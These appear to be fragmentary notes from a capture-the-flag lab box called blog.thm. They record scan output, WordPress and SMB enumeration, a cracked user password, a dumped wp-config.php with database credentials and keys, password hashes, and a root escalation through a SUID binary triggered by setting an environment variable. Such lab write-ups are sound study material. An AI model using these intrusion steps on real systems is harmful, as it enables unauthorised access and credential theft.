22  
80  
139  
445
 
| Username found: bjoel  
| Username found: kwheel
 
| /wp-login.php: Possible admin folder  
| /robots.txt: Robots file  
| /wp-login.php: Wordpress login page.  
| /readme.html: Interesting, a readme.  
|_ /0/: Potentially interesting folder
   

User-agent: *  
Disallow: /wp-admin/  
Allow: /wp-admin/admin-ajax.php
 
S-1-22-1-1000 Unix User\bjoel (Local User)  
S-1-22-1-1001 Unix User\smb (Local User)  
//blog.thm/print$ Mapping: DENIED, Listing: N/A  
//blog.thm/BillySMB Mapping: OK, Listing: OK  
//blog.thm/IPC$ [E] Can't understand response:
   

wpscan
 
kwheel - cutiepie1 - zlbiydwrtfjhmuuymk@ttirv.net
 
jiXvfuIpdw
 
metasploit search wordpress 5.0
 
## wp-config.php:

define('DB_NAME', 'blog');
 
/** MySQL database username */  
define('DB_USER', 'wordpressuser');
 
/** MySQL database password */  
define('DB_PASSWORD', 'LittleYellowLamp90!@');
 
define('AUTH_KEY', 'ZCgJQaT0(*+Zjo}Iualapeo|?~nMtp^1IUrquYx3!#T$ihW8F~_`L+$N E>J!Bm;');  
define('SECURE_AUTH_KEY', 'nz|(+d|| yVX-5_on76q%:M, ?{NVJ,Q(;p3t|_B*]-yQ&|]3}M@Po!f_,T-S4fe');  
define('LOGGED_IN_KEY', 'a&I&DR;PUnPKul^kLBgxYa@`g||{eZf><sf8SmKBi+R7`O?](SuL&/H#hqzO$_:3');  
define('NONCE_KEY', 'Vdd-zzB:/yxg6unZvng,oY-%Z V,i%+Uz_f)S;Efz!;cY3p~]T,g1z*Z[jXe>5Sm');  
define('AUTH_SALT', 'u+k8g;=jbe)6/X~<M1HwINhH(Tno@orx:$_$-#*id)ddBYGGF(]AP?}4?2E|m;5`');  
define('SECURE_AUTH_SALT', '>Rg5>,/^BywVg^A[Etqot:CoU+9<)YPM~h|)Ifd5!iK!L*5+JDiZi33KrYZNd2B7');  
define('LOGGED_IN_SALT', '3kpL-rcnU+>H#t/g>9<)j/u I1/-Ws;h6GrDQ>v8%7@C~`h1lBC/euttp)/8EdA_');  
define('NONCE_SALT', 'JEajZ)y?&.m-1^$(c-JX$zi0qv|7]F%7a6jh]P5SRs+%`*60?WJVk$><b$poQg9>');
   

mysql -h localhost -u 'wordpressuser' -D blog -p
 
LittleYellowLamp90!@
 
bjoel  
kwheel
 
$P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/  
$P$BedNwvQ29vr1TPd80CDl6WnHyjr8te.
 
zlbiydwrtfjhmuuymk@ttirv.net  
nconkl1@outlook.com
 
* [ { name: 'username', value: 'jresig' }, { name: 'password', value: 'secret' } ]
 
$6$oRWsGKq9s.dB752B$T/8nCxvlSdSo3slqsxwS5m.7j4oR2LUizuSybnfmWwTX79El7SksyK9pEvqbzPM2Q3L0xynmTrXcqWREnSLqu1
   

## suid files

/usr/sbin/checker
 
ltrace checker
 
export admin=1
 
./checker
 
root